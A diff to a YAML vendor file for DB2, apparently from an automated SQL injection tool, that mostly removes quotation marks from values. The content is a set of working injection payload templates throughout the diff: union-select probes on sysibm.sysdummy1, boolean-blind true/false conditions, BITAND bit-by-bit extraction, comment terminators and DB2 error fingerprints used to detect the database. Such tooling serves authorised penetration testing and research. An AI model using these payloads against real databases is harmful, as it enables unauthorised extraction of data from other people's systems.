@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   select 
@@ -101,8 +101,8 @@ strategy:
            )
        from sysibm.sysdummy1
    )
-  limit: "limit ${LIMIT}, 5"
-  failsafe: "varchar('' || (1337${INDICE}7330%2b1), 1024)"
+  limit: limit ${LIMIT}, 5
+  failsafe: varchar('' || (1337${INDICE}7330%2b1), 1024)
   calibrator: |
    rpad(
        '${CALIBRATOR_SQL}', 
@@ -110,41 +110,41 @@ strategy:
        '${CALIBRATOR_SQL}'
    )
   limitBoundary: 0
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
-    - "function.db2"
-    - "DB2 SQL Error"
-    - "Warning: db2_execute()"
-    - "Warning: db2_fetch_array()"
+    - function.db2
+    - DB2 SQL Error
+    - 'Warning: db2_execute()'
+    - 'Warning: db2_fetch_array()'
     
  normal: 
-  indices: "union select ${INDICES} from sysibm.sysdummy1"
+  indices: union select ${INDICES} from sysibm.sysdummy1
   capacity: |
    /**
     * repeat gets internal table size error on blind 'where 1=1'
     * => uses rpad instead
     */
    varchar('${LEAD}${INDICE}' || ${CALIBRATOR}, 1024)
-  orderBy: "order by 1337"
+  orderBy: order by 1337
   
  boolean: 
   test: 
    falses: 
-    - "1 = 0"
+    - 1 = 0
     - "'a' %21= 'a'"
     - "'b' %21= 'b'"
-    - "1 = 2"
-    - "1 %21= 1"
-    - "2 %21= 2"
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
    trues: 
-    - "0 = 0"
+    - 0 = 0
     - "'a' %21= 'b'"
     - "'a' = 'a'"
-    - "1 = 1"
-    - "2 = 2"
-    - "1 %21= 2"
-   initialization: "0%2b1 = 1"
+    - 1 = 1
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
    bit: |
     0 != BITAND(
         ascii(
@@ -156,6 +156,6 @@ strategy:
         ), 
         ${BIT}
     )
-   length: "length(${INJECTION}) > ${INDEX}"
+   length: length(${INJECTION}) > ${INDEX}
    
-  blind: "and ${TEST}"
+  blind: and ${TEST}
